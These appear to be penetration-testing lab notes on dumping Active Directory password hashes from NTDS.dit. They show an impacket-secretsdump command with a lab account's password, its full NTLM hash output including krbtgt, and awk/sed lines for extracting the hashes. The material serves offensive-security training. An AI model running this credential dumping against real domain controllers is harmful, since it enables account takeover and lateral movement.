

- NTDS.dit
	- A database used to store AD data
		- User information
		- Group information
		- Security descriptors
		- Password hashes

we can use `secretsdumo` with the switch `-just-dc` 

`secretsdump MARVEL.local/Adminitrator:'Password1'@192.168.176.128 -just-dc-ntlm` 


```
kali@kali ~> impacket-secretsdump MARVEL.local/fcastle:'Password1'@192.168.176.129 -just-dc-ntlm
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bfe44203e5edf12ba925fd7510cc11bb:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
ZFYTyjkzaS:2103:aad3b435b51404eeaad3b435b51404ee:14a024d509d1ef49cc7afd3fa975d8ab:::
eviluser:2105:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:000da82dd9ff3c760716ff02e5a926e5:::
PUNISHER$:2101:aad3b435b51404eeaad3b435b51404ee:44b68a86550cff9083755da2f4108ba3:::
SPIDERMAN$:2102:aad3b435b51404eeaad3b435b51404ee:73c579454e6ad41dd65eff5d110ef41a:::
[*] Cleaning up...

```


## extra filtering stuff

```
kali@kali ~> cat hashes | awk -F ':' '{print $4}' | sed 1,3d

920ae267e048417fcfe00f49ecbd4b33
31d6cfe0d16ae931b73c59d7e0c089c0
bfe44203e5edf12ba925fd7510cc11bb
1bc3af33d22c1c2baec10a32db22c72d
f4ab68f27303bcb4024650d8fc5f973a
64f12cddaa88057e06a81b54e73b949b
c39f2beb3d2ec06a62cb887fb391dee0
14a024d509d1ef49cc7afd3fa975d8ab
58a478135a93ac3bf058a5ea0e8fdb71
000da82dd9ff3c760716ff02e5a926e5
44b68a86550cff9083755da2f4108ba3
73c579454e6ad41dd65eff5d110ef41a

```

```
kali@kali ~> cat hashes | awk -F ':' '{print $1,$4}' | sed 1,4d | sed '$d'
Administrator 920ae267e048417fcfe00f49ecbd4b33
Guest 31d6cfe0d16ae931b73c59d7e0c089c0
krbtgt bfe44203e5edf12ba925fd7510cc11bb
MARVEL.local\tstark 1bc3af33d22c1c2baec10a32db22c72d
MARVEL.local\SQLService f4ab68f27303bcb4024650d8fc5f973a
MARVEL.local\fcastle 64f12cddaa88057e06a81b54e73b949b
MARVEL.local\pparker c39f2beb3d2ec06a62cb887fb391dee0
ZFYTyjkzaS 14a024d509d1ef49cc7afd3fa975d8ab
eviluser 58a478135a93ac3bf058a5ea0e8fdb71
HYDRA-DC$ 000da82dd9ff3c760716ff02e5a926e5
PUNISHER$ 44b68a86550cff9083755da2f4108ba3
SPIDERMAN$ 73c579454e6ad41dd65eff5d110ef41a
```

